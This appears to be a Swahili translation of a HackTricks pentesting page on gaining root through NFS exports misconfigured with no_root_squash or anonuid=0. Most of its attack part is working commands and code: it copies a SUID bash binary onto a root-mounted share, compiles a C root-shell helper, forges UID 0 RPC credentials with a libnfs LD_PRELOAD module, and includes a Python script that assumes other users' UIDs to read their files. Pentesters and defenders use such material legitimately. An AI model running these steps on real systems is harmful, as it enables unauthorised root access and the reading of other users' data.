# Kuongeza Privilege Kutokana na Usanidi Mbaya wa NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Msingi kuhusu Squashing

Kwa NFS AUTH_SYS/AUTH_UNIX, seva hukagua ruhusa za faili kwa kutumia `uid` na `gid` zilizotolewa katika kila ombi la RPC. Aina nyingine za usalama, kama Kerberos, hutumia credentials tofauti, na seva inaweza kubadilisha credentials za nambari kabla ya kukagua ruhusa.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Hubadilisha kila UID na GID kuwa za akaunti isiyojulikana, ambayo chaguo-msingi yake ni `nobody` (65534) kwenye Linux. `no_all_squash` ndiyo chaguo-msingi kwa maombi yasiyotoka kwa root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Hii ndiyo chaguo-msingi kwenye Linux na hubadilisha maombi yenye UID/GID 0 (root) kuwa ya akaunti isiyojulikana; UID na GID nyingine hazibadilishwi.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Huzima root squashing, hivyo maombi yenye UID/GID 0 yanaweza kushughulikiwa kama root kwenye seva.<sup>[[4]](#references)</sup>

Ikiwa client inayeruhusiwa inaweza ku-mount export inayoweza kuandikwa katika **`/etc/exports`** iliyosanidiwa kwa **`no_root_squash`**, maombi yake ya UID/GID 0 yanaweza kuandika humo kama mtumiaji root wa seva.<sup>[[4]](#references)</sup>

`root_squash` hubadilisha UID/GID 0 pekee; chini ya AUTH_SYS, **UID/GID ya nambari isiyo sifuri** ya client inayeruhusiwa bado inaweza kuendana na akaunti tofauti kwenye seva. Kwa hiyo, export inayoweza kuandikwa inaweza kuwa njia ya kuvuka akaunti za watumiaji hata ikiwa root squashing imewashwa, iwapo client inaweza kuunda faili kwa utambulisho huo wa nambari na seva inaruhusu ufikiaji. Kwa handoff ya SUID/SGID, hakikisha pia mmiliki wa faili inayotokana, ruhusa za kutekeleza, hali ya `nosuid` kwenye mount ya seva, ACL, na SELinux au sera nyingine. Jina la njia iliyowekwa export, chaguo la `rw`, au nambari inayolingana pekee havithibitishi kuwa client inaruhusiwa, export inatumika, au mifumo hiyo miwili ina ramani sawa ya utambulisho inayotumika. Kagua `/etc/exports` na metadata ya ndani bila kufanya mabadiliko; usi-mount share mpya au kuunda faili ya majaribio wakati wa uchunguzi.<sup>[[4]](#references)[[5]](#references)</sup>

Kwa maelezo zaidi kuhusu **NFS**, angalia:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Kuongeza Privilege

### Ulinganishaji wa anonymous unaolingana na root

Usikague `no_root_squash` pekee. Kwa `root_squash,anonuid=0,anongid=0`, ombi la UID/GID 0 la client husquash-iwa **kurudi kuwa root**. Kwa `all_squash,anonuid=0,anongid=0`, hata utambulisho wa client asiye root hubadilishwa kuwa root kwenye seva. Kwenye export ya `sec=sys` inayoweza kuandikwa, mojawapo ya usanidi huu inaweza kutoa primitive ya faili inayomilikiwa na root inayotumiwa katika handoff ya SUID hapa chini; masharti ya client anayeruhusiwa na mount ya victim bado yanatumika.<sup>[[4]](#references)</sup>

Kwenye seva, tumia `exportfs -v` kukagua export inayotumika na chaguo za **client inayolingana**, ikiwemo `rw`, `sec=`, hali ya squash, na `anonuid`/`anongid`. Pia kagua `/etc/exports.d/*.exports` unapochunguza usanidi; huenda `/etc/exports` pekee isiwe na taarifa zote.<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Remote Exploit

Chaguo la 1 kwa kutumia bash:
- Kwenye client anayeruhusiwa, mount export inayoweza kuandikwa kama root, nakili **`/bin/bash`** ndani yake, weka biti yake ya **SUID**, kisha iendeshe kutoka kwenye mount ya victim ambayo haitumii `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Ili faili iliyopakiwa ibaki ikimilikiwa na root, server lazima ihifadhi UID 0 ya client kwa kutumia **`no_root_squash`** au ipe ramani ya ombi kwa UID 0 kwa kutumia **`anonuid=0`**. Vinginevyo, binary ya SUID ya akaunti nyingine inawezekana tu ikiwa client inaweza kuiunda au kuimiliki kwa kutumia UID/GID ya nambari ya akaunti hiyo.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Chaguo la 2 kwa kutumia msimbo wa C uliokompiliwa:
- Mount saraka kutoka kwa client aliyeruhusiwa, nakili ndani yake payload iliyokompiliwa inayotumia vibaya ruhusa za SUID, weka biti yake ya **SUID**, kisha uitekeleze kutoka kwa victim (angalia baadhi ya [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Vizuizi vilevile kama hapo awali

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Exploit ya Ndani

> [!TIP]
> Kumbuka kwamba ikiwa unaweza kuunda **tunnel kutoka kwenye mashine yako hadi kwenye mashine ya mwathiriwa, bado unaweza kutumia toleo la Remote kutekeleza privilege escalation kwa ku-tunnel ports zinazohitajika**.\
> Mbinu ifuatayo ni muhimu wakati `/etc/exports` inazuia export kwa IP ya mwathiriwa: client ya remote haiwezi kui-mount, lakini mbinu ya ndani inaweza kutumia share ambayo tayari ime-mount kwenye host iliyoruhusiwa.<sup>[[2]](#references)</sup>\
> Kwa mbinu hii ya libnfs isiyohitaji privileges, export katika **`/etc/exports`** lazima itumie flag ya `insecure` ili process iweze kutumia source port isiyohifadhiwa; `secure` ndiyo chaguo-msingi, ingawa process inayoweza kufunga port iliyohifadhiwa haihitaji chaguo hili.<sup>[[1]](#references)[[4]](#references)</sup>

### Taarifa za Msingi

Client ya NFSv3 AUTH_UNIX hujumuisha UID, GID na groups zake zinazotumika katika kila call, na server huzitumia kukagua permissions. Mbinu hii ya ndani hutumia vibaya mfumo huo kwa kughushi credentials za RPC kupitia [libnfs](https://github.com/sahlberg/libnfs); preload module yake inasaidia kubadilisha UID/GID katika muktadha wa NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kukompile Library

Mfano wa libnfs unaweza kuhitaji marekebisho kwa kernel lengwa; walkthrough iliyotumika hapa inabainisha hasa kwamba syscalls za fallocate zinapaswa kuwekewa maoni kabla ya kukompile preload module.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Kuendesha Exploit

Mfano huu huunda helper ndogo ya C inayowasha shell, kisha huiweka kwenye share na kutumia `ld_nfs.so` ikiwa na UID 0 katika muktadha wa NFS ili kuifanya iwe SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compile msimbo wa exploit:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Weka exploit kwenye share na ubadilishe ruhusa zake kwa kughushi UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Tekeleza exploit ili kupata haki za root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonasi: NFShell kwa Ufikiaji wa Faili kwa Siri

Baada ya kupata root access, muundo huu wa `nfsh.py` huweka effective UID kuwa UID ya faili lengwa kabla ya kutekeleza amri, hivyo kuruhusu ufikiaji bila kubadilisha umiliki kwa kujirudia.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Endesha kama:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Hadithi kuhusu njia isiyojulikana sana ya NFS privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Ufafanuzi wa Itifaki ya NFS Toleo la 3](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
